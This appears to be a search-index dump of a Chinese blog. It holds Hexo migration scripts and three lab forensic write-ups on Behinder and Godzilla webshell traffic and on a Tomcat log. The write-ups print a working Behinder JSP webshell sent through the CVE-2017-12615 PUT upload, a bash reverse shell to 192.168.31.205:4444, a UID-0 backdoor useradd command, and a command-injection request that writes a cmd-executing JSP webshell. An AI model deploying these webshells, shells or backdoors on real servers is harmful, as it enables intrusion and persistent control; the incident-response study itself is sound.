&quot;w&quot;, encoding=&quot;utf-8&quot;) as f:            f.write(front_matter + content)        print(f&quot;已迁移：&#123;file&#125;&quot;)  # 打印迁移进度print(&quot;所有网络安全笔记迁移完成！&quot;)\n\n\n使用步骤：\n\n\n将脚本保存为 migrate_notes.py，放在 D:\\Blog 目录（与笔记源目录同级）。\n\n打开 CMD 命令行，执行 cd D:\\Blog 切换到脚本目录。\n\n运行 python migrate_notes.py，等待脚本完成所有笔记迁移。\n\n\n二、Hexo 构建（hexo g）报错解决1. 问题 1：Nunjucks Error（无法解析 SSTI 代码中的 &#123;&#123; &#125;&#125; 语法）\n报错信息：Unable to call class.base.subclasses, which is undefined or falsey。原因是笔记中 SSTI 渗透测试代码的 &#123;&#123; &#125;&#125; 被 Hexo&#x2F;Butterfly 主题的 Nunjucks 模板引擎误解析为模板语法。\n\n解决方案：如果代码块中含有 &#123;&#123; &#125;&#125;，必须用 ` 和 ` 包裹，避免模板引擎解析。例如：\n\n\n\nimport os# 配置 Hexo 文章目录posts_dir = r&quot;D:\\BlogFile\\source\\_posts&quot;for filename in os.listdir(posts_dir):    if filename.endswith(&quot;.md&quot;):        file_path = os.path.join(posts_dir, filename)        with open(file_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:            lines = f.readlines()  # 按行读取文章内容        new_lines = []        in_code_block = False  # 标记是否处于 ``` 代码块内        code_block_content = []  # 暂存代码块内容        for line in lines:            stripped_line = line.strip()            # 检测代码块开始（``` 开头）            if stripped_line.startswith(&quot;```&quot;):                if not in_code_block:                    # 进入代码块，初始化暂存列表                    in_code_block = True                    code_block_content = [line]                else:                    # 退出代码块，检查是否含 &#123;&#123; &#125;&#125;                    code_block_content.append(line)                    in_code_block = False                    # 若代码块含 &#123;&#123;，则用 &#123;% raw %&#125; 包裹                    if any(&quot;&#123;&#123;&quot; in content_line for content_line in code_block_content):                        new_lines.append(&quot;&#123;% raw %&#125;\\n&quot;)  # 加 raw 开始标记                        new_lines.extend(code_block_content)  # 加代码块内容                        new_lines.append(&quot;&#123;% endraw %&#125;\\n&quot;)  # 加 raw 结束标记                    else:                        new_lines.extend(code_block_content)  # 不含 &#123;&#123;，直接添加            elif in_code_block:                # 处于代码块内，暂存内容                code_block_content.append(line)            else:                # 非代码块内容，直接添加                new_lines.append(line)        # 将处理后的内容写回文件        with open(file_path, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:            f.writelines(new_lines)        print(f&quot;已处理代码块：&#123;filename&#125;&quot;)print(&quot;所有文章代码块 &#123;&#123; &#125;&#125; 解析问题修复完成！&quot;)\n\n\n2. 问题 2：unknown block tag: endraw（ 成对 / 嵌套错误）\n\n- **报错原因**：正文中误加多余的 {% raw %}/{% endraw %}（如表格、列表中），或 {% raw %} 未完整包裹代码块导致标签不成对。\n\n- **解决方案**：用脚本清理正文中多余的 raw 标签，仅保留代码块内的有效 raw 标记：\n\n{% raw %}\nimport os# 配置 Hexo 文章目录posts_dir = r&quot;D:\\BlogFile\\source\\_posts&quot;for filename in os.listdir(posts_dir):    if filename.endswith(&quot;.md&quot;):        file_path = os.path.join(posts_dir, filename)        with open(file_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:            lines = f.readlines()        new_lines = []        in_code_block = False        code_block_content = []        for line in lines:            stripped_line = line.strip()            # 跳过正文中单独的 raw 标签（非代码块内）            if stripped_line in (&quot;&#123;% raw %&#125;&quot;, &quot;&#123;% endraw %&#125;&quot;):                continue            # 处理代码块            if stripped_line.startswith(&quot;```&quot;):                if not in_code_block:                    in_code_block = True                    code_block_content = [line]                else:                    code_block_content.append(line)                    in_code_block = False                    # 含 &#123;&#123; 的代码块加 raw 包裹                    if any(&quot;&#123;&#123;&quot; in c for c in code_block_content):                        new_lines.append(&quot;&#123;% raw %&#125;\\n&quot;)                        new_lines.extend(code_block_content)                        new_lines.append(&quot;&#123;% endraw %&#125;\\n&quot;)                    else:                        new_lines.extend(code_block_content)            elif in_code_block:                code_block_content.append(line)            else:                new_lines.append(line)        # 写回处理后的内容        with open(file_path, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:            f.writelines(new_lines)        print(f&quot;已清理多余 raw 标签：&#123;filename&#125;&quot;)print(&quot;所有文章 raw 标签错误修复完成！&quot;)\n{% endraw %}三、Hexo 图片路径适配问题1. 问题：本地 Windows 路径（C:\\Users…\\image.png）无法显示\n原因：Hexo 生成的是静态网页，无法访问本地电脑的绝对路径（如 C:\\Users\\…\\image.png），仅支持项目内相对路径或网络图片 URL。\n\n解决方案：用脚本自动迁移本地图片到 Hexo 图片目录，并替换 Markdown 中的路径：\n\n\nimport osimport shutilimport re# 配置路径posts_dir = r&quot;D:\\BlogFile\\source\\_posts&quot;  # Hexo 文章目录hexo_img_dir = r&quot;D:\\BlogFile\\source\\img&quot;  # Hexo 图片存储目录（自动创建）# 匹配 Typora 默认的本地图片路径（格式：C:\\Users\\用户名\\...\\image-时间戳.png）img_path_pattern = re.compile(r&#x27;C:\\\\Users\\\\[^\\\\]+\\.*\\\\image-\\d+\\.png&#x27;)# 若 Hexo 图片目录不存在，自动创建if not os.path.exists(hexo_img_dir):    os.makedirs(hexo_img_dir)# 遍历所有文章，处理图片for filename in os.listdir(posts_dir):    if filename.endswith(&quot;.md&quot;):        file_path = os.path.join(posts_dir, filename)        with open(file_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:            article_content = f.read()        # 提取文章中所有本地图片路径        local_img_paths = img_path_pattern.findall(article_content)        if local_img_paths:            for local_img_path in local_img_paths:                # 提取图片文件名（如 image-20250701191610806.png）                img_filename = os.path.basename(local_img_path)                # 复制本地图片到 Hexo 图片目录                shutil.copy2(local_img_path, os.path.join(hexo_img_dir, img_filename))                # 替换文章中的路径为 Hexo 相对路径（/img/图片名.png）                article_content = article_content.replace(local_img_path, f&#x27;/img/&#123;img_filename&#125;&#x27;)            # 将修改后的内容写回文章            with open(file_path, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:                f.write(article_content)            print(f&quot;已处理图片：&#123;filename&#125;（共迁移 &#123;len(local_img_paths)&#125; 张）&quot;)        else:            print(f&quot;无本地图片：&#123;filename&#125;&quot;)print(&quot;所有文章图片路径适配完成！&quot;)\n\n\n关键说明：\n\n\n脚本仅匹配 Typora 默认截图路径（C:\\Users...\\image-xxxx.png），若图片路径不同，可修改 img_path_pattern 正则表达式。\n\n迁移后图片存储在 Hexo 项目的 source&#x2F;img 目录，文章中路径变为 &#x2F;img&#x2F;xxx.png（Butterfly 主题可直接识别）。\n\n\n四、其他关键问题1. 问题：Butterfly 主题 cover 字段不填的影响\n答案：\n\n\n不填 cover：文章列表页（首页 &#x2F; 分类页）的文章卡片无自定义封面，显示主题默认背景（无报错，功能完全正常）。\n\n\n\n填 cover：需配置 cover: &#x2F;img&#x2F;xxx.webp（图片需放在 source&#x2F;img 目录），列表页和文章详情页顶部会显示自定义封面，提升视觉效果；若需统一封面，可在主题配置文件中设置默认封面。\n\n\n\n五、核心工具 &#x2F; 命令总结\n\n\n操作场景\n关键命令 &#x2F; 工具\n\n\n\nHexo 文章预览\nhexo clean &amp;&amp; hexo g &amp;&amp; hexo s（清理缓存→生成静态文件→启动本地服务器，访问 http://localhost:4000）\n\n\nHexo 文章部署\nhexo d（需提前配置 GitHub Pages&#x2F;Gitee Pages 等部署目标）\n\n\nMarkdown 笔记迁移\n上述 migrate_notes.py 脚本\n\n\n代码块 &#123;&#123; &#125;&#125; 解析修复\n上述 fix_code_raw.py 脚本\n\n\n本地图片路径适配\n上述 migrate_imgs.py 脚本\n\n\n批量转换 WebP 图片（可选）\nWindows 批处理脚本 toWebp.bat（依赖 Google cwebp 工具）\n\n\n","categories":["疑难杂症","博客搭建"],"tags":["疑难杂症"]},{"title":"冰蝎3.0-jsp流量分析","url":"/2025/09/16/%E5%86%B0%E8%9D%8E3.0-jsp%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","content":"冰蝎3.0-jsp流量分析题目：\n1.黑客IP是什么？\n2.黑客上传的Webshell名是什么？\n3.黑客上传WebShell的时间是多少？（格式如：flag{YYYY-MM-DD HH:MM:SS}）\n4.木马的解密key是什么?\n5.黑客执行的第一个命令是什么?\n6.黑客上传的文件内容是什么?\n7.黑客下载的文件内容是什么? \n8.服务器内的flag是什么？\n1.黑客IP是什么？根据靶场题目说找冰蝎的流量，我们可以看一下冰蝎流量包的特征\n1. POST传参2. User-Agent: Mozilla/5.0(windows NT 6.1;Trident/7.0; rv:11.0)like Gecko3. Accept :text/html,application/xhtml+xml,application/xml;q=0.9,image/webp, image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.94. Accept-Language:h-CN,zh;q=0.9,en-US;q=0.8,en;q=0.75. 部分 3.0 以后的子版本至 4.0 以后增加了 referer 参数，末尾文件名随机大小写6. 尝试利用默认密钥等解密 成功还原算法明文即可认定对应工具\n\n\n\n\n根据题目提示 webshell 使用工具是冰蝎 冰蝎流量特征 使用http协议  post提交 打开wireshark进行筛选\nhttp.request.method==&quot;POST&quot;\n\n\n可以看到这里有很多&#x2F;indeX.jsp文件可能是木马文件，我们在过滤一下看看\nhttp contains &quot;indeX.jsp&quot;\n\n\n\n可以看到第一条就是put文件上传，http追踪一下打开典型的冰蝎流量特征,并且HTTP 状态码 201 Created 表示：\n\n请求已经成功，并且服务器已经创建了新的资源至此\n\nflag&#123;192.168.31.61&#125;\n\n2.黑客上传的Webshell名是什么？这里根据上题直接提交flag\nflag&#123;indeX.jsp&#125;\n\n3.黑客上传WebShell的时间是多少？（格式如：flag{YYYY-MM-DD HH:MM:SS}）在左下角的方框信息中，展开”Frame”，UTC Arrival Time:”就是上传Webshell的时间\n\nflag&#123;2025-02-22 07:47:38&#125;\n\n4.木马的解密key是什么?继续分析我们刚才找到webshell，key就在请求包里面\n\nflag&#123;3f0af7bb4dbcfbd7&#125;\n\n5.黑客执行的第一个命令是什么?对流量包进行分析，逐个解密，在长度为 510 的流量包中，将请求包丢去工具解密看到黑客执行命令\nflag&#123;ifconfig&#125;\n\n6.黑客上传的文件内容是什么?继续返回流量包进行分析，在长度为362的流量包里面发现了创建文件的语句和内容\n\n\n在这发现在路径&#x2F;home&#x2F;xj下面创建了一个up.txt文件flag就在里面\n根据第一条流量包我们推测，黑客是利用了Tomcat 任意写入文件漏洞 (CVE-2017-12615)-02得到shell的\n这里我们进行复现【vulhub漏洞复现】通过 PUT 方法的 Tomcat 任意写入文件漏洞 (CVE-2017-12615)-02参考这篇文章\n\nPUT /shell.jsp/ HTTP/1.1Host: 靶场IP地址:8081User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brConnection: keep-aliveCookie: JSESSIONID=3F426B8219ACAB91DF13B18D987842BCUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Priority: u=0, iContent-Type: application/x-www-form-urlencodedContent-Length: 782&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;\n\n\n\n\n我们启动靶场，访问靶场地址,根据put流量包得知tomcat是部署在8081端口上面的\n\n\n访问网址进行抓包发送到Fuzzer模块，将请求头复制上去然后修改你要上传文件的名字这里任意取一个我这里是shell.jsp/记得后面一定一定要带上/很重要，返回包201显示上传成功\n\n我们这里用冰蝎链接\n\n进入服务器内部在home&#x2F;xj下面拿到flag\n\nflag&#123;485375b7b06ad856a788c0d95229f35c&#125;\n\n7.黑客下载的文件内容是什么?翻阅流量包到最后一条，在最底下显示flag\n继续分析流量包\n\n\n发现：download &#x2F;opt&#x2F;apache-tomcat-8.5.19&#x2F;conf&#x2F;server.xml\n说明在下载server.xml文件\nhttp追踪流，可以看到，最下方写有一个flag\n\nflag&#123;3aacab9ca36a6894c75048e4faf47052&#125;\n\n8.服务器内的flag是什么？继续访问服务器内部在root下面拿到了flag\n\nflag&#123;ae1d04dd3d15c6a18f904fe50fdf7eca&#125;\n\n","categories":["流量分析"],"tags":["学习笔记","流量分析","网络取证","应急响应"]},{"title":"哥斯拉ekp版本流量分析","url":"/2025/09/16/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","content":"哥斯拉ekp版本流量分析1.黑客上传的木马文件名是什么？根据这个靶场提示这里是用哥斯拉连接的\n我们先复习一下哥斯拉链接webshell的流量特征是什么\n1. 流量中可见`eval`、`base64_decode`、`strrev`等函数2. 强特征:链接失败情况下2个流量包，成功为 3个流量包3. 第一个请求总会发送大量数据，这是配置信息，且请求包内无 cookie，服务器响应包无内容，生成一个 session，后续请求会带上此session 到请求包中的 cookie中3、强特征:生成的 cookie 后面有个分号4. Accept:   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*   /*;q=0.85. Accept-Language :   zh-CN,zh;q=0.8,zh-Tw;q=0.7,zh-HK;q=0.5,en-Us;q=0.3,en;q=0.26. 尝试利用默认密钥等解密 成功还原算法明文即可认定对应工具\n\n我们打开靶场下载的流量包，拿到wireshark分析，哥斯拉是用post的传输的，我们直接在wireshark里面抓取POST方式传输的流量包\nhttp.request.method ==&quot;POST&quot;\n\n\n这里出现了很多./index.jsp文件我们再对这个文件进行针对搜索\nhttp contains &quot;/.index.jsp&quot;\n\n\n\n\n看到这里有个put包点开http追踪，是一个典型的 PUT Webshell 上传攻击流量\n\n至此确定这个文件是木马文件\nflag&#123;.index.jsp&#125;\n\n2.黑客上传的木马连接密码是什么？从第一题的上题最后的图片分析可知flag是\nflag&#123;mypass&#125;\n\n3.黑客上传的木马连接密钥是什么？从第一题的上题最后的图片分析可知flag是\nflag&#123;9adbe0b3033881f8&#125;\n\n4.黑客连接webshell后执行的第一条命令是什么？这里我们要对之前webshell的加密方式进行解密，自己不会这方面找在网上找了大佬的用，该代码用于解密一个经过双层 Base64 编码 + AES 加密的 Payload（如 WebShell 类、恶意类），并保存为 a.bin 文件，供后续分析或加载\nimport javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;import java.util.Base64;import java.math.BigInteger;import java.security.MessageDigest;import java.io.FileOutputStream;public class exp &#123;    static String xc = &quot;9adbe0b3033881f8&quot;;    static String pass = &quot;mypass&quot;;    public static void main(String[] args) throws Exception &#123;        String m=&quot;替换为你抓到的两层 Base64 加密字符串&quot;;        // base64 → base64 → AES 解密        byte[] data = base64Decode(m.getBytes());        data = base64Decode(data);        byte[] decrypted = x(data, false);        System.out.println(decrypted);        FileOutputStream fos = new FileOutputStream(&quot;a.bin&quot;);        fos.write(decrypted);        fos.close();    &#125;    public static String md5(String s) &#123;        String ret = null;        try &#123;            MessageDigest m = MessageDigest.getInstance(&quot;MD5&quot;);            m.update(s.getBytes(), 0, s.length());            ret = new BigInteger(1, m.digest()).toString(16).toUpperCase();        &#125; catch (Exception e) &#123;        &#125;        return ret;    &#125;    public static byte[] x(byte[] s, boolean m) &#123;        try &#123;            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &quot;AES&quot;));            return c.doFinal(s);        &#125; catch (Exception e) &#123;            return null;        &#125;    &#125;    public static byte[] base64Decode(String bs) throws Exception &#123;        Class base64;        byte[] value = null;        try &#123;            base64 = Class.forName(&quot;java.util.Base64&quot;);            Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);            value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);        &#125; catch (Exception e) &#123;            try &#123;                base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);                Object decoder = base64.newInstance();                value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] &#123; String.class &#125;).invoke(decoder, new Object[] &#123; bs &#125;);            &#125; catch (Exception e2) &#123;&#125;        &#125;        return value;    &#125;    public static byte[] base64Decode(byte[] bytes) &#123;        Class base64;        byte[] value = null;        Object decoder;        try &#123;            base64 = Class.forName(&quot;java.util.Base64&quot;);            decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);            value = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;byte[].class&#125;).invoke(decoder, new Object[]&#123;bytes&#125;);        &#125; catch (Exception e) &#123;            try &#123;                base64 = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);                decoder = base64.newInstance();                value = (byte[]) decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[]&#123;String.class&#125;).invoke(decoder, new Object[]&#123;new String(bytes)&#125;);            &#125; catch (Exception e2) &#123;            &#125;        &#125;        return value;    &#125;    public static String base64Encode(byte[] bs) throws Exception &#123;        Class base64;        String value = null;        try &#123;            base64 = Class.forName(&quot;java.util.Base64&quot;);            Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);            value = (String) Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);        &#125; catch (Exception e) &#123;            try &#123;                base64 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);                Object Encoder = base64.newInstance();                value = (String) Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] &#123; byte[].class &#125;).invoke(Encoder, new Object[] &#123; bs &#125;);            &#125; catch (Exception e2) &#123;&#125;        &#125;        return value;    &#125;&#125;\n\n继续翻阅流量包，在长度为440这里发现了不对，前面都是哥斯拉的初始化流量\n如何判断哥斯拉初始化流量特征？\n核心特征：\n\n初始化流量包序列\n连接成功时固定发送3个连续请求包：\n首包：大体积POST请求（约23KB），上传加密Payload，响应为空但设置PHPSESSID。\n次包：测试连接（methodName=test），响应体为 16位MD5 + Base64(&quot;ok&quot;) + 16位MD5 结构（PHP版小写，JSP版大写）。\n三包：获取环境信息（methodName=getBasicsInfo），响应结构同上。\n\n\n检测要点：包顺序、响应体MD5包裹结构（强特征）。\n\n\nCookie异常\nCookie值末尾带分号（如PHPSESSID=xxx;），违反HTTP规范（强特征）。\n\n\n加密与响应结构\n使用PHP_XOR_BASE64加密器时，请求含eval、base64关键词；RAW模式全乱码。\n响应体始终为 MD5前16位 + Base64密文 + MD5后16位 。\n\n\n弱特征（易修改）\nUA头默认含JDK版本（如Java/1.8.0_121）。\nAccept头固定为text/html, image/gif, image/jpeg, *; q=.2, /; q=.2（JDK引入）\n\n\n\n\n这里的流量包不再是三个连续的流量包并且是一个大两个小的特征了\n讲加密密文拿去解密\n\n现将密文进行一次url解码\n\n\n再把密文丢进刚刚的解密脚本里面，解密完出来会在目录下面生成一个a.bin文件，讲bin后缀改为zip解压\n\n解压完后用010打开，可以看到黑客执行的命令\nflag&#123;cat /etc/passwd&#125;\n\n\n5.这个木马是根据哪个参数进行回显的？（提交参数名）从刚才的返回包的流量包就能看出来\nflag&#123;Rec106e_config&#125;\n\n\n6.黑客留下后门的反连的IP和PORT是什么？（flag{IP,PORT})继续分析流量包，在长度为552这里发现没有返回包，怀疑是黑客进行的反联操作\n\n将包复制先进行一次url解码\n\n\n\n讲解码完后的base64编码放进刚刚的解密脚本里面会在当前目录下生成一个a.bin文件将后缀改为zip用文本编译器打开就行了我这里用的sublime\n可以看到这里执行了一段base64加密代码，讲加密代码解密\necho L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMjA1LzQ0NDQgMD4mMQ==|base64 -d|bash\n\n\n可看到是黑客的反连操作能看到反连的地址和端口\nflag&#123;192.168.31.205,4444&#125;\n\n\n7.黑客通过后门反连执行的第一条命令是什么？继续看流量包吧，上面我们看到了黑客的地址和端口，我们针对进行搜索\nip.src==192.168.31.205 &amp;&amp; tcp.port==4444\n\n\n\n\n按照时间顺序排序第一个打开具看到了命令执行 第一个命令是ls\nflag&#123;ls&#125;\n\n\n8.黑客新增的后门用户名密码是什么？（提交flag{username,password}）从上面那段base64加密后解密可以看到\n\n\n\n\n以下表格总结命令中各参数的作用，结合资料中的技术细节：\n\n\n\n参数&#x2F;子命令\n含义\n作用解析\n\n\n\n\nuseradd\n添加用户\n主命令，用于创建新用户。\n\n\n\n-p \\openssl passwd -1 -salt ‘salt’ Xj@666.&#96;&#96;\n设置加密密码\n-p 需接受加密密码；子命令生成密码哈希： - openssl passwd: 生成密码哈希的工具。 - -1: 使用 MD5 算法加密（旧版 Linux 兼容）。- -salt &#39;salt&#39;: 指定盐值（salt）为 salt，盐值用于增加哈希随机性，防止彩虹表攻击（静态盐值降低安全性）。- Xj@666.: 明文密码（含特殊字符 @ 和 .，需确保转义）。- 输出示例：类似 $1$salt$... 的哈希字符串（(https://epubservercos.yuewen.com/E8FBE0/29427546503421506/epubprivate/OEBPS/Images/45_02.jpg)）。\n\n\n\nx\n用户名\n新用户登录名为 x（建议用描述性名称，避免混淆）。\n\n\n\n-o\n允许重复 UID\n覆盖 UID 唯一性限制，允许创建另一个 UID 0 的用户（默认 UID 0 仅限 root）。\n\n\n\n-u 0\n用户 ID (UID)\n设置 UID 为 0（root 的 UID），赋予 root 权限。\n\n\n\n-g root\n主组\n设置主组为 root（GID 0）。\n\n\n\n-G root\n附加组\n添加用户到附加组 root（确保用户属于 root 组）。\n\n\n\n-s /bin/bash\n默认 Shell\n设置登录 Shell 为 Bash（标准交互环境）。\n\n\n\n关键子命令详解：openssl passwd -1 -salt &#39;salt&#39; Xj@666.\nflag&#123;x,Xj@666.&#125;\n\n9.黑客新增的后门文件是什么？（提交完整路径）上机操作,使用命令grep -r &quot;/dev/tcp&quot; .用于递归搜索当前目录及子目录下所有文件，找出包含 /dev/tcp 字符串的内容。\n为什么要搜索这个文件?\n\n黑客常利用 /dev/tcp 在入侵主机上建立反向连接。此命令可快速定位含有此类特征的恶意脚本（如 PHP、Shell、Python 文件）\n关键目录建议：若怀疑系统被入侵，需扩展搜索至敏感目录：\ngrep -r “&#x2F;dev&#x2F;tcp” &#x2F;etc &#x2F;var &#x2F;tmp &#x2F;home &#x2F;usr&#x2F;local&#x2F;bin\n\n\n可以看到后门文件被写在了.&#x2F;etc&#x2F;hosts.allow下面\n\nflag&#123;/etc/hosts.allow&#125;\n\n10.黑客的后门公钥是什么？（提交公钥的md5值）上机查看 &#x2F;etc&#x2F;ssh&#x2F;sshd_config文件\n\nsshd_config 的恶意修改\n\n黑客在 /etc/ssh/sshd_config 中添加自定义路径：\n\nAuthorizedKeysFile .ssh/authorized_keys /root/.bash_h1story/.keys\n\n路径伪装（.bash_h1story）、命名异常（.keys）、配置篡改（sshd_config）及 MD5 指纹唯一性 的四重验证，可确认 /root/.bash_h1story/.keys 为黑客植入的公钥文件\n\n\nflag&#123;d7bf0e27d6f533604250faceb28b6d4b&#125;\n\n11.黑客注入的内存马代理是哪种类型的将长度为552的流量包解密后发现是java的内存吗\n\n\n\nflag&#123;suo5&#125;\n\n\n\n12.这个代理的路径是什么根据上一题解密出来的的流量包发现 最后的请求路径为&#x2F;connect\nflag&#123;/connect&#125;\n\n13.这个代理的连接密码是什么代理的链接密码就是userAgent这个值\nflag&#123;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3&#125;\n\n\nflag&#123;e3c77fd790af8d25fe271cd275eb405e&#125;\n\n\n\n14.黑客扫描了哪个ip的哪些端口分析流量包讲最后一条的这个流量包进行解密\t\n\n\n\n\n873,3306,80,8080,81,8081,21,22,88,8088,8888,1433,443,445,3389,222都是一些常见的端口\nflag&#123;127.0.0.1,873,3306,80,8080,81,8081,21,22,88,8088,8888,1433,443,445,3389,222&#125;\n\n15、黑客扫描到开放的端口有哪些？（端口从小到大排序提交 如：flag{21,22,23}）我们把这里套流量包的的返回包解密\n\nO0pxNnI7RBLmTfxrZXBrd1hPUptIuxNFvFA0fwK3H6tpwnz3L//0O5GRj/NMw8O+Ve0PQGfQQGLSAWkVLE1AB9EV0bTKEBBhx/vVcCW6STm7yr2TwRZZHhMn5g3vJvX1\n\nString m=&quot;O0pxNnI7RBLmTfxrZXBrd1hPUptIuxNFvFA0fwK3H6tpwnz3L//0O5GRj/NMw8O+Ve0PQGfQQGLSAWkVLE1AB9EV0bTKEBBhx/vVcCW6STm7yr2TwRZZHhMn5g3vJvX1&quot;;       // base64 → base64 → AES 解密       byte[] data = base64Decode(m.getBytes());       //data = base64Decode(data);       byte[] decrypted = x(data, false);       System.out.println(decrypted);       FileOutputStream fos = new FileOutputStream(&quot;a.zip&quot;);       fos.write(decrypted);       fos.close();\n\n脚本少解密一次base64编码\n\n\n有1的是开放的端口 222 8081\nflag&#123;222,8081&#125;\n\n\n\n最后感谢两位大佬的文章\nhttps://ta0.fun/posts/ae37354d/\nhttps://xia0le.github.io/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90\n","categories":["流量分析"],"tags":["学习笔记","流量分析","网络取证","应急响应"]},{"title":"日志分析-Tomcat日志分析","url":"/2025/09/16/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-Tomcat%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","content":"日志分析-Tomcat日志分析1、Tomcat日志所在的绝对路径是？\n2、攻击者对某网站进行了口令爆破。请你判断口令成功匹配的请求的响应码是？\n3、攻击者向admin.jsp的管理员留言板界面发送了恶意JS代码从而构成了存储型XSS。已知攻击者试图盗取管理员cookie，并将其发送至其本地服务器上。请你判断其服务器上用于盗取cookie而监听的端口是？\n4、攻击者利用执行系统命令的参数是？\n5、攻击者通过某种手段遗留了后门文件，请你找到该文件并按需提交其文件中的flag\n1、Tomcat日志所在的绝对路径是？在C盘打开就能看到一个server点进去就找到日志路径了\nflag&#123;C:\\server\\apache-tomcat-11.0.5\\logs&#125;\n\n\n2、攻击者对某网站进行了口令爆破。请你判断口令成功匹配的请求的响应码是？我们查看tomcat日志，找到这个最大的日志文件\n\n拉倒最下面，看到黑客对网站爆破最后一条日志的请求状态码是302，就是这个了\nflag&#123;302&#125;\n\n\n3、攻击者向admin.jsp的管理员留言板界面发送了恶意JS代码从而构成了存储型XSS。已知攻击者试图盗取管理员cookie，并将其发送至其本地服务器上。请你判断其服务器上用于盗取cookie而监听的端口是？根据日志来看他爆破的网站是在demo目录，我们返回到tomcat目录在webapps下面找到了messages.txt文件，打开就发现了ip地址后面就是监听端口\nflag&#123;5000&#125;\n\n\n4、攻击者利用执行系统命令的参数是？我们返回刚才的日志文件，在最下面看到了攻击者利用命令执行了一个whoami的命令这个ip就是执行系统命令的参数\nflag&#123;ip&#125;\n\n\n5、攻击者通过某种手段遗留了后门文件，请你找到该文件并按需提交其文件中的flag我们看到最下面的那个图片，这里使用了echo写入了一串命令\n\n192.168.5.66 - - [19/Mar/2025:23:16:42 +0800] &quot;GET /connect/ping.jsp?ip=8.8.8.8+%26%26+echo+%5E%3C%25%40+page+language%3D%22java%22+import%3D%22java.util.*%2Cjava.io.*%22+%25%5E%3E%5E%3C%25+String+cmd+%3D+request.getParameter%28%22cmd%22%29%3B+if+%28cmd+%21%3D+null%29+%7B+Process+p+%3D+Runtime.getRuntime%28%29.exec%28cmd%29%3B+BufferedReader+reader+%3D+new+BufferedReader%28new+InputStreamReader%28p.getInputStream%28%29%29%29%3B+String+line%3B+while+%28%28line+%3D+reader.readLine%28%29%29+%21%3D+null%29+%7B+out.println%28line+%2B+%22%5E%3Cbr%5E%3E%22%29%3B+%7D+%7D+%25%5E%3E+%3E+C%3A%5Cserver%5Capache-tomcat-11.0.5%5Cwebapps%5CROOT%5Chello.jsp HTTP/1.1&quot; 200 1349\n\n可以看到这里在webapps&#x2F;ROOT&#x2F;下面写了一个hello.jsp文件\n\n\n\n拿到flag{youmadeit}\n扩展\n将这个命令拿去解码看看\n\n\n攻击者目标是：上传一个后门（WebShell）到 C: 盘，命名为 ping.jsp，然后远程执行命令。\n还原后是：\nip=8.8.8.8 &amp;&amp; echo ^&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; %^&gt;&lt;% String cmd = request.getParameter(&quot;cmd&quot;); if (cmd != null) &#123;    Process p = Runtime.getRuntime().exec(cmd);    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));    String line;    while ((line = reader.readLine()) != null) &#123;        out.println(line + &quot;&lt;br&gt;&quot;);    &#125;&#125; %&gt; &gt; C:\\server\\apache-tomcat-11.0.5\\webapps\\ROOT\\hello.jsp\n\n这个命令的意思是：\n\n利用参数拼接，将一段 恶意Java JSP脚本写入 hello.jsp 文件\nhello.jsp 会执行攻击者通过 URL 参数传来的命令 cmd\n相当于 部署了一个Web Shell\n\n\n✅ 